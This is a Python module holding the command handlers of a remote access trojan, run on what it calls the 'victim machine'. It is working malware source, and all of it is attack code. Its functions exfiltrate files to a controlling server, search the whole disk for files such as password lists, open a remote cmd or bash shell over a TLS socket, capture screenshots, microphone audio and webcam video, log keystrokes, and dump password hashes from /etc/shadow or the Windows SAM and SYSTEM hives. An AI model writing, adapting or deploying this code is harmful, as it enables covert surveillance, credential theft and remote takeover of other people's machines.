"""
Actions executed on the victim machine (client RAT).

Each function corresponds to a command available in the RAT.
This file is imported by client_app.py which routes commands
received from the server to the appropriate function.

Compatibility: Windows and Linux.
"""

import base64
import io
import platform
import socket
import subprocess
import threading
import wave
from pathlib import Path

import sounddevice

from rat_project.common.protocol import decode_message, encode_message
from rat_project.utils.logger_config import setup_logger

logger = setup_logger("client.actions")

# ---------------------------------------------------------------------------
# Keylogger state
# ---------------------------------------------------------------------------

_keylogger_listener = None  # pynput Listener instance, or None if not running
_keylogger_buffer: list[str] = []


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _get_os() -> str:
    """Return the operating system name ('Windows' or 'Linux')."""
    return platform.system()


# ---------------------------------------------------------------------------
# download — send a file from the victim to the server
# ---------------------------------------------------------------------------


def handle_download(remote_path: str) -> dict:
    """
    Read a file on the victim machine and encode it in base64
    to send it to the server.

    The server requested this file via the 'download <path>' command.
    The content is base64-encoded because the protocol is JSON (text).

    Args:
        remote_path: Absolute or relative path of the file on the victim.

    Returns:
        dict: Response with the base64-encoded content, or an error.
    """
    path = Path(remote_path)

    if not path.exists():
        logger.warning("Download requested but file not found: %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"File not found: {remote_path}",
        }

    if not path.is_file():
        logger.warning("Download requested but path is not a file: %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Path is not a file: {remote_path}",
        }

    try:
        file_bytes = path.read_bytes()
        encoded = base64.b64encode(file_bytes).decode("utf-8")
        logger.info("Download: %s (%s bytes)", remote_path, len(file_bytes))
        return {
            "type": "command_result",
            "command": "download",
            "filename": path.name,
            "data": encoded,
            "output": f"File sent: {path.name} ({len(file_bytes)} bytes)",
        }

    except PermissionError:
        logger.warning("Download denied (permissions): %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Permission denied: {remote_path}",
        }

    except Exception as exc:
        logger.exception("Error during download of %s: %s", remote_path, exc)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Error: {exc}",
        }


# ---------------------------------------------------------------------------
# upload — receive a file sent by the server and write it on the victim
# ---------------------------------------------------------------------------


def handle_upload(message: dict) -> dict:
    """
    Receive a file sent by the server and write it on the victim.

    The server encoded the file in base64 in the message.
    We decode it and write it to the current directory of the agent.

    Args:
        message: Server message containing 'filename' and 'data' (base64).

    Returns:
        dict: Write confirmation or error message.
    """
    filename = message.get("filename", "uploaded_file")
    encoded_data = message.get("data", "")

    if not encoded_data:
        logger.warning("Upload received but no data in message")
        return {
            "type": "command_result",
            "command": "upload",
            "error": "No data received.",
        }

    try:
        file_bytes = base64.b64decode(encoded_data)
        save_path = Path(filename)
        save_path.write_bytes(file_bytes)
        logger.info("Upload received and saved: %s (%s bytes)", save_path, len(file_bytes))
        return {
            "type": "command_result",
            "command": "upload",
            "output": f"File received and saved: {save_path} ({len(file_bytes)} bytes)",
        }

    except Exception as exc:
        logger.exception("Error during upload of %s: %s", filename, exc)
        return {
            "type": "command_result",
            "command": "upload",
            "error": f"Error: {exc}",
        }


# ---------------------------------------------------------------------------
# search — search for a file on the victim machine
# ---------------------------------------------------------------------------


def search_file(filename: str) -> str:
    """
    Search for a file by name on the entire victim machine.

    Args:
        filename: Name of the file to search for (e.g. "passwords.txt").

    Returns:
        str: List of found paths, or a message if no results.
    """
    results = []
    root = Path("C:/") if _get_os() == "Windows" else Path("/")

    for path in root.rglob(filename):
        try:
            results.append(str(path))
        except PermissionError:
            continue

    if not results:
        return f"No file found for: {filename}"

    return "\n".join(results)


# ---------------------------------------------------------------------------
# get_system_info — return system information
# ---------------------------------------------------------------------------


def get_system_info() -> str:
    """
    Return detailed system information of the victim.

    Uses 'systeminfo' on Windows and 'uname -a' on Linux.

    Returns:
        str: Output of the system command.
    """
    import locale

    system_name = _get_os()
    command = "systeminfo" if system_name == "Windows" else "uname -a"
    encoding = "cp850" if system_name == "Windows" else locale.getpreferredencoding(False)

    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        encoding=encoding,
        errors="replace",
        check=False,
    )
    return result.stdout.strip() or result.stderr.strip() or "No output"


# ---------------------------------------------------------------------------
# get_ipconfig — retrieve network configuration of the victim machine
# ---------------------------------------------------------------------------


def get_ipconfig() -> str:
    """
    Return the network configuration of the victim machine.

    Uses 'ipconfig /all' on Windows and 'ip a' on Linux.

    Returns:
        str: Output of the network command.
    """
    command = "ipconfig /all" if _get_os() == "Windows" else "ip a"
    encoding = "cp850" if _get_os() == "Windows" else "utf-8"

    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        encoding=encoding,
        errors="replace",
        check=False,
    )
    return result.stdout.strip() or result.stderr.strip() or "No output"


# ---------------------------------------------------------------------------
# take_screenshot — capture a screenshot of the victim's screen
# ---------------------------------------------------------------------------


def take_screenshot() -> str:
    """
    Take a screenshot of the victim's screen.

    Uses mss (cross-platform) to capture the primary monitor,
    encodes the result as base64 PNG for JSON transport.

    Returns:
        str: Base64-encoded PNG image, or empty string on failure.
    """
    try:
        import mss
        import mss.tools

        with mss.mss() as sct:
            monitor = sct.monitors[1]  # primary monitor
            screenshot = sct.grab(monitor)
            png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
            encoded = base64.b64encode(png_bytes).decode("utf-8")
            logger.info("Screenshot captured (%d bytes)", len(png_bytes))
            return encoded

    except Exception as exc:
        logger.exception("Screenshot error: %s", exc)
        return ""


# ---------------------------------------------------------------------------
# handle_shell — open an interactive shell on the victim machine
# ---------------------------------------------------------------------------


def handle_shell(conn: object) -> None:
    """
    Open an interactive shell on the victim machine.

    Starts a cmd (Windows) or bash (Linux) process and relays
    commands/output between the server and the shell process.

    Args:
        conn: TLS socket connected to the server.
    """
    shell_cmd = "cmd.exe" if _get_os() == "Windows" else "/bin/bash"
    encoding = "cp850" if _get_os() == "Windows" else "utf-8"

    logger.info("Opening shell: %s", shell_cmd)

    process = subprocess.Popen(
        shell_cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        encoding=encoding,
        errors="replace",
    )

    try:
        while True:
            data = conn.recv(65536)
            if not data:
                logger.info("Connection closed during shell")
                break

            message = decode_message(data.decode("utf-8").strip())
            msg_type = message.get("type")
            command = message.get("command", "")

            if msg_type == "command" and command == "shell_stop":
                logger.info("Shell closed on server request")
                break

            if msg_type == "shell_input":
                cmd_input = message.get("input", "")
                logger.info("Shell input: %s", cmd_input)

                try:
                    process.stdin.write(cmd_input + "\n")
                    process.stdin.flush()

                    result_lines: list[str] = []

                    def _read_output() -> None:
                        try:
                            for line in process.stdout:
                                result_lines.append(line)
                                if not line.strip():
                                    break
                        except Exception:
                            pass

                    reader = threading.Thread(target=_read_output, daemon=True)
                    reader.start()
                    reader.join(timeout=3)

                    conn.sendall(encode_message({
                        "type": "shell_output",
                        "command": "shell",
                        "output": "".join(result_lines),
                    }))

                except Exception as exc:
                    logger.exception("Shell error for command: %s", cmd_input)
                    conn.sendall(encode_message({
                        "type": "shell_output",
                        "command": "shell",
                        "output": f"Error: {exc}",
                    }))

    finally:
        try:
            process.terminate()
            process.wait(timeout=2)
        except Exception:
            process.kill()
        logger.info("Shell process terminated")


# ---------------------------------------------------------------------------
# record_audio — record microphone audio and return it as a base64 WAV string
# ---------------------------------------------------------------------------

AUDIO_SAMPLE_RATE = 44100  # Hz (CD quality)
AUDIO_CHANNELS = 1  # mono


def record_audio(duration: int = 5) -> str:
    """
    Record audio from the client microphone and return it as a base64 WAV string.

    Uses sounddevice to capture PCM int16 audio, then wraps it in a WAV
    container (stdlib wave module) and encodes it in base64 for JSON transport.

    Args:
        duration: Recording duration in seconds (default: 5).

    Returns:
        str: Base64-encoded WAV audio data.
    """
    logger.info("Recording audio for %s second(s)...", duration)

    frames = sounddevice.rec(
        int(duration * AUDIO_SAMPLE_RATE),
        samplerate=AUDIO_SAMPLE_RATE,
        channels=AUDIO_CHANNELS,
        dtype="int16",
    )
    sounddevice.wait()

    logger.info("Recording finished (%s frames captured)", len(frames))

    wav_buffer = io.BytesIO()
    with wave.open(wav_buffer, "wb") as wav_file:
        wav_file.setnchannels(AUDIO_CHANNELS)
        wav_file.setsampwidth(2)  # 2 bytes = 16 bits per sample
        wav_file.setframerate(AUDIO_SAMPLE_RATE)
        wav_file.writeframes(frames.tobytes())

    return base64.b64encode(wav_buffer.getvalue()).decode("utf-8")


# ---------------------------------------------------------------------------
# webcam_snapshot — capture a photo from the victim's webcam
# ---------------------------------------------------------------------------


def webcam_snapshot() -> str:
    """
    Capture one frame from the victim's webcam.

    Opens the default camera (index 0), reads one frame,
    encodes it as JPEG, then returns it as a base64 string
    so it can be sent over the JSON protocol.

    Returns:
        str: Base64-encoded JPEG image, or empty string on failure.
    """
    import cv2

    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        logger.warning("webcam_snapshot: no webcam available (index 0)")
        return ""

    try:
        success, frame = cam.read()
        if not success:
            logger.warning("webcam_snapshot: failed to read frame")
            return ""

        _, buffer = cv2.imencode(".jpg", frame)
        encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
        logger.info("webcam_snapshot: frame captured (%d bytes)", len(buffer))
        return encoded

    except Exception as exc:
        logger.exception("webcam_snapshot error: %s", exc)
        return ""

    finally:
        cam.release()


# ---------------------------------------------------------------------------
# webcam_stream — stream live video from the victim's webcam
# ---------------------------------------------------------------------------


def webcam_stream(conn: socket.socket) -> None:
    """
    Stream live webcam frames to the server until a stop signal is received.

    Each frame is sent as {"type": "stream_frame", "data": "<base64 JPEG>"}.
    The loop stops when the server sends {"type": "stream_stop"} or on error.

    Args:
        conn: TLS socket connected to the server.
    """
    import cv2

    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        logger.warning("webcam_stream: no webcam available (index 0)")
        conn.sendall(encode_message({"type": "stream_error", "error": "No webcam available"}))
        return

    conn.settimeout(0.05)

    try:
        while True:
            success, frame = cam.read()
            if not success:
                logger.warning("webcam_stream: failed to read frame")
                break

            _, buffer = cv2.imencode(".jpg", frame)
            encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
            conn.sendall(encode_message({"type": "stream_frame", "data": encoded}))

            # Check for stop signal (non-blocking)
            try:
                raw = conn.recv(4096)
                if raw:
                    msg = decode_message(raw.decode("utf-8").strip())
                    if msg.get("type") == "stream_stop":
                        break
            except TimeoutError:
                pass

    except Exception as exc:
        logger.exception("webcam_stream error: %s", exc)

    finally:
        cam.release()
        conn.settimeout(None)
        logger.info("webcam_stream: stopped")


# ---------------------------------------------------------------------------
# toggle_keylogger — record victim's keystrokes
# ---------------------------------------------------------------------------


def toggle_keylogger() -> str:
    """
    Start or stop the keylogger.

    - First call  : starts a background listener, returns a confirmation.
    - Second call : stops the listener, returns all captured keystrokes.

    Uses pynput.keyboard.Listener which runs in a separate thread.

    Returns:
        str: Status message, or captured keystrokes on stop.
    """
    from pynput import keyboard

    global _keylogger_listener, _keylogger_buffer

    if _keylogger_listener is not None:
        _keylogger_listener.stop()
        _keylogger_listener = None
        captured = "".join(_keylogger_buffer)
        _keylogger_buffer = []
        logger.info("Keylogger stopped. %d chars captured.", len(captured))
        return f"Keylogger stopped.\nCaptured keystrokes:\n{captured}"

    def on_press(key: keyboard.Key) -> None:
        try:
            _keylogger_buffer.append(key.char)
        except AttributeError:
            _keylogger_buffer.append(f"[{key.name}]")

    _keylogger_listener = keyboard.Listener(on_press=on_press)
    _keylogger_listener.start()
    logger.info("Keylogger started.")
    return "Keylogger started."


# ---------------------------------------------------------------------------
# hashdump — retrieve password hashes
# ---------------------------------------------------------------------------


def hashdump() -> str:
    """
    Retrieve password hashes depending on the OS.

    - Linux   : reads /etc/shadow (requires root privileges)
    - Windows : saves SAM and SYSTEM hives via reg.exe
                (requires Administrator privileges)

    Returns:
        str: Shadow file content, saved hive paths, or an error message.
    """
    import tempfile

    os_name = _get_os()

    if os_name == "Linux":
        shadow_path = Path("/etc/shadow")
        try:
            content = shadow_path.read_text(encoding="utf-8")
            logger.info("hashdump Linux: %d lines retrieved", content.count("\n"))
            return content
        except PermissionError:
            logger.warning("hashdump: permission denied for %s (root required)", shadow_path)
            return f"Error: permission denied to read {shadow_path} (root required)"
        except FileNotFoundError:
            return f"Error: {shadow_path} not found"
        except Exception as exc:
            logger.exception("hashdump Linux error: %s", exc)
            return f"Error: {exc}"

    elif os_name == "Windows":
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                sam_path = str(Path(tmpdir) / "SAM")
                system_path = str(Path(tmpdir) / "SYSTEM")

                for hive, dest in [("HKLM\\SAM", sam_path), ("HKLM\\SYSTEM", system_path)]:
                    result = subprocess.run(
                        ["reg", "save", hive, dest, "/y"],
                        capture_output=True,
                        text=True,
                        check=False,
                    )
                    if result.returncode != 0:
                        logger.warning("hashdump Windows error on %s: %s", hive, result.stderr.strip())
                        return f"Error saving {hive}: {result.stderr.strip()}"

                logger.info("hashdump Windows: SAM and SYSTEM hives saved")
                return (
                    f"Hives saved:\n"
                    f"  SAM    -> {sam_path}\n"
                    f"  SYSTEM -> {system_path}\n"
                    "(Binary files — use secretsdump or impacket to extract hashes)"
                )
        except Exception as exc:
            logger.exception("hashdump Windows error: %s", exc)
            return f"Error: {exc}"

    else:
        return f"Unsupported OS for hashdump: {os_name}"
